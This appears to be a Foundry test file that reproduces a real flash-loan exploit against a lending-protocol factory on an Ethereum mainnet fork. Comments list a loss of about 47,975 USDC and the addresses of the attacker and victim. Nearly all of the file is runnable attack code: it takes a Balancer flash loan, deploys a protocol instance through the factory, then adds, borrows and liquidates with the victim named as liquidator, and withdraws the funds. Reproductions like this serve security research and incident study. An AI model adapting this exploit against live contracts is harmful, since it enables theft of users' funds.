// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~47,975 USDC
// Attacker : 0x0cD979cC9699C07EA50135643ED00b828Afa1719
// Attack Contract : 0xbd0D52E3A3F61F697A8767b395cE574Fa837c25b
// Vulnerable Contract : 0xFBBe6BD840aFfc96547854a1F821d797a8c662D9
// Attack Tx : 0x657fcedd

// @Analysis
// Balancer Vault : 0xBA12222222228d8Ba445958a75a0704d566BF2C8
// Victim : 0x14Ce500a86F1e3aCE039571e657783E069643617

interface IFactory {
    function deploy(
        address implementation,
        address attacker,
        address token,
        address target,
        bytes memory data
    ) external returns (address);
}

interface ILendingProtocol {
    function init(
        address factory,
        address attacker,
        address token,
        address target,
        bytes memory data
    ) external;

    function addAsset(uint256 amount) external;
    function addCollateral(uint256 amount) external;
    function borrow(uint256 amount, address borrower) external;
    function liquidate(
        address[] memory users,
        uint256[] memory amounts,
        address liquidator,
        address receiver,
        bool revertIfNotProfitable
    ) external;
    function removeAsset(uint256 amount, address to) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault vault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IFactory factory = IFactory(0xFBBe6BD840aFfc96547854a1F821d797a8c662D9);
    ILendingProtocol lendingProtocol;

    address constant IMPLEMENTATION =
        0xF541947cBb87FB3b7Ca81dAe9c66831167eA9f8C;
    address constant VICTIM = 0x14Ce500a86F1e3aCE039571e657783E069643617;

    function setUp() public {
        // Fork mainnet at specific block
        vm.createSelectFork("mainnet", 15460093);

        // Label addresses for better trace output
        vm.label(address(USDC), "USDC");
        vm.label(address(vault), "Balancer Vault");
        vm.label(address(factory), "Factory");
        vm.label(VICTIM, "Victim");
    }

    function testExploit() public {
        // Setup flash loan parameters
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 47975756672; // ~47,975 USDC

        // Encode user data for flash loan
        bytes memory userData = abi.encode(
            address(factory),
            address(this),
            address(USDC),
            address(this),
            bytes4(0x04343f58)
        );

        // Execute flash loan
        vault.flashLoan(address(this), tokens, amounts, userData);

        // Print attacker balance
        console.log(
            "Attacker USDC balance after attack:",
            USDC.balanceOf(address(this))
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) external {
        require(msg.sender == address(vault), "Only Balancer Vault");

        // Deploy lending protocol through factory
        address lendingProtocolAddr = factory.deploy(
            IMPLEMENTATION,
            address(this),
            address(USDC),
            address(this),
            abi.encodeWithSelector(bytes4(0x04343f58))
        );
        lendingProtocol = ILendingProtocol(lendingProtocolAddr);

        // Approve USDC spending
        USDC.approve(address(factory), type(uint256).max);

        // Add asset and collateral
        lendingProtocol.addAsset(amounts[0]);
        lendingProtocol.addCollateral(amounts[0]);

        // Borrow
        lendingProtocol.borrow(amounts[0], address(this));

        // Liquidate
        address[] memory users = new address[](1);
        users[0] = address(this);

        uint256[] memory liquidateAmounts = new uint256[](1);
        liquidateAmounts[0] = amounts[0];

        lendingProtocol.liquidate(
            users,
            liquidateAmounts,
            VICTIM,
            address(0),
            true
        );

        // Remove asset
        lendingProtocol.removeAsset(amounts[0], address(this));

        // Repay flash loan
        USDC.approve(address(vault), amounts[0]);
        USDC.transfer(address(vault), amounts[0]);
    }
    fallback() external {
        return;
    }
}
